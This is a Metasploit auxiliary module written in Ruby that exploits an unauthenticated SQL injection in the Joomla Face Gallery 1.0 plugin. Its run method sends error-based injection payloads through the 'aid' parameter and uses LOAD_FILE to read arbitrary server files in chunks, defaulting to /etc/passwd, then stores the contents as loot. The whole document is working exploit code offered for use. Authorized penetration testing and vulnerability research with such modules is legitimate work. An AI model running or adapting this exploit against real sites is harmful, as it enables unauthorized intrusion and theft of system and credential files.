##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Face Gallery 1.0 Unauthenticated SQL Injection Arbitrary File Read',
      'Description'    => %q{
      This module will attempt exploit an unauthenticated SQL injection in the Face Gallery 1.0
      plugin for Joomla in order to read an arbitrary file from the file system. A slightly
      misconfigured SQL instance is likely required in that the MySQL user will need
      to have the FILE permission. This is a common misconfiguration.
      },
      'License'        => 'ExploitHub',
      'Author'         =>
        [
          'Brandon Perry <bperry.volatile[at]gmail.com>', #metasploit module
        ],
      'References'     =>
        [
          ['EDB', 'http://www.exploit-db.com/exploits/34754/'],
        ],
      'DisclosureDate' => 'Aug 17 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"]),
        OptInt.new('AID', [true, "The ID to use in the SQL injection", 1])
      ], self.class)

  end

  def run
    front_marker = Rex::Text.rand_text_alpha(6)
    back_marker = Rex::Text.rand_text_alpha(6)
    file = datastore['FILEPATH'].unpack("H*")[0]
    aid = datastore['AID']

    data = ''
    done = false
    i = 0
    while !done
      payload = "#{aid} AND (SELECT 3001 FROM(SELECT COUNT(*),CONCAT(0x#{front_marker.unpack("H*")[0]}"
      payload << ",(MID((IFNULL(CAST(HEX(LOAD_FILE(0x#{file})) AS CHAR),0x20)),#{i*50+1},50)),0x#{back_marker.unpack("H*")[0]}"
      payload << ",FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'index.php'),
        'vars_get' => {
          'option' => 'com_facegallery',
          'view' => 'images',
          'aid' => payload,
          'lang' => 'en'
        }
      })

      data << [$1].pack("H*") if res.body =~ /#{front_marker}(.*)#{back_marker}/
      done = true if $1 == ''
      i = i + 1
    end

    path = store_loot("joomla.file", "text/plain", datastore['RHOST'], data, datastore['FILEPATH'])

    if path and path != ''
      print_good("File saved to: #{path}")
    end
  end
end

